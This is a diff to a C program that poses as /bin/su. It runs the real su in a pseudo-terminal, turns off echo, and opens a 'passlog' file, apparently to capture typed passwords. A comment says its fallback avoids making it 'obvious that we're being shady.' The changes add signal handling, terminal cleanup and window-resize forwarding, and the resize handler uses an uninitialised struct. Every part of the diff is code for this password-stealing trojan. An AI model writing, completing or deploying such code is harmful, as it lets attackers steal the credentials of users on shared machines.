@@ -1,5 +1,6 @@
 // Cribbed heavily from Scriptjunkie's stdiobindshell.c
 
+#include <signal.h>
 #include <errno.h>
 #include <termios.h>
 #include <stdio.h>
@@ -10,13 +11,37 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <sys/select.h>
-#include <signal.h>
 
 #define BUF_SIZE 255
 
-int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);
+extern int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);
 
+__sighandler_t old_sigwinch, old_sigint;
 struct termios old_term_settings;
+int terminalfd;
+
+void cleanup_and_exit(int status)
+{
+    // reset terminal
+    tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings);
+    // Reset signal handlers
+    signal(SIGINT, old_sigint);
+    signal(SIGWINCH, old_sigwinch);
+    exit(status);
+}
+
+void handle_int(int sig)
+{
+    write(terminalfd, &old_term_settings.c_cc[VINTR], 1);
+}
+
+void handle_winch(int sig)
+{
+    struct winsize ws;
+    printf("handling winch\n");
+    ioctl(STDIN_FILENO, TIOCSWINSZ, &ws);
+    ioctl(terminalfd, TIOCSWINSZ, &ws);
+}
 
 void funnel(pid_t pid, int in_fd, int out_fd)
 {
@@ -29,12 +54,11 @@ void funnel(pid_t pid, int in_fd, int out_fd)
         if(errno == 5)
         {
             waitpid(pid, &status, WNOHANG);
-            tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings); //reset terminal
             if (WIFEXITED(status))
             {
-                exit(WEXITSTATUS(status));
+                cleanup_and_exit(WEXITSTATUS(status));
             } else {
-                exit(1);
+                cleanup_and_exit(1);
             }
         }
     }
@@ -48,14 +72,15 @@ int main(int argc, char * const *argv)
     char *command;
     pid_t pid;
 
-    int terminalfd;
-
     FILE *file = fopen("passlog", "a+");
 
     char buf[BUF_SIZE];
     char output[BUF_SIZE];
 
     struct winsize ws;
+
+    old_sigwinch = signal(SIGWINCH, handle_winch);
+    old_sigint = signal(SIGINT, handle_int);
 
     // Get current window size
     ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
@@ -64,27 +89,27 @@ int main(int argc, char * const *argv)
     if (tcgetattr(STDIN_FILENO, &new_term_settings) == -1)
     {
         perror("tcgetattr");
-        exit(1);
+        cleanup_and_exit(1);
     }
 
     old_term_settings = new_term_settings;
+
     /* ECHO off, other bits unchanged */
     new_term_settings.c_lflag &= ~ECHO;
-    //printf("%p %p\n", &new_term_settings, &old_term_settings);
 
     if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term_settings) == -1)
     {
         perror("tcsetattr");
-        exit(1);
+        cleanup_and_exit(1);
     }
 
     pid = forkpty(&terminalfd, (char *)NULL, NULL, &ws);
-    // This lets us fall back to just exec'ing su if forkpty fails. We won't
-    // get the password, but it also won't make it obvious that we're being
-    // shady.
-    if (pid == -1 || pid == 0)
+    // Doing the exec in the child and also on error lets us fall back to just
+    // exec'ing su if forkpty fails. We won't get the password, but it also
+    // won't make it obvious that we're being shady.
+    if (pid == 0 || pid == -1)
     {
-        exit(execvp("/bin/su", argv));
+        cleanup_and_exit(execvp("/bin/su", argv));
     }
 
     // Testing on Ubuntu, forkpty seems to ignore the window size, so set it
@@ -128,30 +153,20 @@ int main(int argc, char * const *argv)
         struct timeval tv;
         int retval;
 
-        /* Watch stdin (fd 0) to see when it has input. */
-
         FD_SET(STDIN_FILENO, &rfds);
         FD_SET(terminalfd, &rfds);
-
-        /* Wait up to five seconds. */
 
         tv.tv_sec = 5;
         tv.tv_usec = 0;
 
         retval = select(FD_SETSIZE, &rfds, NULL, NULL, &tv);
 
-        if (retval == -1)
+        if (retval == -1 || retval == 0)
         {
-            perror("select()");
-        }
-        else if (retval)
-        {
-            //printf("Data is available now. %d\n", retval);
-            /* FD_ISSET(0, &rfds) will be true. */
-        }
-        else
-        {
-            //printf("No data within five seconds.\n");
+            // Then either there was an error (such as ctrl-c interrupting the
+            // select()), or the time elapsed without input from either side.
+            // Whichever it was, there's nothing to read, so go back to the top
+            // of the loop.
             continue;
         }
 
@@ -167,7 +182,5 @@ int main(int argc, char * const *argv)
 
     }
 
-    exit(EXIT_SUCCESS);
-
+    cleanup_and_exit(EXIT_SUCCESS);
 }
-
